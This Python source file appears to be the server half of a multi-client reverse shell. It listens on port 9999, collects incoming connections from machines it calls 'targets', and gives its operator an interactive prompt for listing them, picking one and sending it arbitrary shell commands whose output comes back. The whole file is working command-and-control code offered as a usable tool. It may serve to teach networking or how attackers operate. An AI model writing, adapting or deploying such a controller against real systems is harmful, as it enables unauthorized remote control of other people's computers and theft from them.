from re import S
import socket
import sys
import threading
import time
from queue import Queue


# Configs
NUM_THREADS = 2
JOB_NUM = [1, 2]  # Thread nos
QUEUE_ = Queue()
ALL_CONNECTIONS = []
ALL_ADDRESSES = []

"""
Thread 1 : Listen and accept connectino from clients
Thread 2 : Sending commands to an already connected client


"""


# To create a socket
def createSocket():
    try:
        global host, port, S
        host = ""
        port = 9999
        S = socket.socket()
    except socket.error as msg:
        print(f"[INFO] Socket error : {msg}")


# Binding the socket and listening for connections
def bindSocket():
    try:
        global host, port, S
        print(f"[INFO] Binding the port : {port}")

        S.bind((host, port))
        S.listen(5)  # No of retries it tolerate
    except socket.error as msg:
        print(f"[INFO]Socket binding error {msg}")
        print("[INFO] Retrying...")
        bindSocket()


# Establish connection with a client (socket must be listening)
def socketAccept():
    conn, address = S.accept()
    print(f"[INFO]Connection has been established")
    print(f"Connected to url: {address[0]}:{address[1]}")

    sendCommands(conn)

    conn.close()


# Helper function to execute commands via the connection object
def sendCommands(conn):
    while True:
        cmd = input()

        # whenever we send the quit command it will stop the connection
        if cmd == 'quit':
            conn.close()
            S.close()
            sys.exit()

        # If the given the command is valid
        if len(str.encode(cmd)) > 0:

            # we have to covert the string formatted command into bytes which will be send as data packets
            conn.send(str.encode(cmd))
            # Collecting the client response from the sent command
            # 1024 - setting the maximum data chunk size we can get
            # Converting the output into string format
            client_response = str(conn.recv(1024), 'utf-8')
            print(client_response, end="")


# Close all the previous connections when server.py is restarted
def reset():
    for connection in ALL_CONNECTIONS:
        connection.close()

    del ALL_CONNECTIONS[:]
    del ALL_ADDRESSES[:]


# Handling connection from multiple clients and saving then into a list
def acceptingConnections():
    reset()

    while True:
        try:
            conn, address = S.accept()
            S.setblocking(1)  # Prevents timeout

            ALL_CONNECTIONS.append(conn)
            ALL_ADDRESSES.append(address)

            print(
                f"[INFO] Connection has been established : {address[0]}:{address[1]}")
        except:
            print(f"[ERROR] Unable to establish connection...")


"""
2nd Thread function
    - See all the clients
    - Select a client
    - Send commands to the connected client
"""


# Interactive prompt(shell) for sending commands
def startShell():
    while True:
        cmd = input("Shell> ")
        if cmd == 'list':
            listConnections()

        elif "select" in cmd:
            conn = getTarget(cmd)

            if conn is not None:
                sendTargetCommands(conn)

        else:
            print("[INFO] Command not recognized...")


# Display all current active connection with the client
def listConnections():
    results = ""

    for idx, conn in enumerate(ALL_CONNECTIONS):
        try:
            conn.send(str.encode(" "))
            # The chunk size is very high because we dont know how much data we can recieve
            conn.recv(201480)

        except:
            del ALL_CONNECTIONS[idx]
            del ALL_ADDRESSES[idx]
            continue

        results += f"{idx} - {ALL_ADDRESSES[idx][0]}:{ALL_ADDRESSES[idx][1]}\n"

    print(f"[INFO] All the clients...")
    print(results)


# Selecting the target
def getTarget(cmd):
    try:
        targetId = int(cmd.split()[1])
        conn = ALL_CONNECTIONS[targetId]
        ip = ALL_ADDRESSES[targetId][0]
        port = ALL_ADDRESSES[targetId][1]
        print(f"[INFO] Connected to {ip}:{port}")
        print(f"{ALL_ADDRESSES[targetId][0]}> ", end="")

        return conn

    except:
        print("[ERROR] Selection not Valid...")
        return None


# Helper function to  send command to clients
def sendTargetCommands(conn):
    while True:
        try:
            cmd = input()

            # whenever we send the quit command it will stop the connection
            if cmd == 'quit':
                break

            # If the given the command is valid
            if len(str.encode(cmd)) > 0:

                # we have to covert the string formatted command into bytes which will be send as data packets
                conn.send(str.encode(cmd))
                # Collecting the client response from the sent command
                # 1024 - setting the maximum data chunk size we can get
                # Converting the output into string format
                client_response = str(conn.recv(1024), 'utf-8')
                print(client_response, end="")
        except:
            print("[ERROR] Error in executiing commands...")
            break


# Create worker threads
def createWorkers():
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Don the next job that is in the queue (handle connection, send commands)
def work():
    while True:
        x = QUEUE_.get()
        if x == 1:
            createSocket()
            bindSocket()
            acceptingConnections()

        if x == 2:
            startShell()

        QUEUE_.task_done()


def createJobs():
    for j in JOB_NUM:
        QUEUE_.put(j)

    QUEUE_.join()


# Main function
def main():
    createWorkers()
    createJobs()


if __name__ == "__main__":
    main()
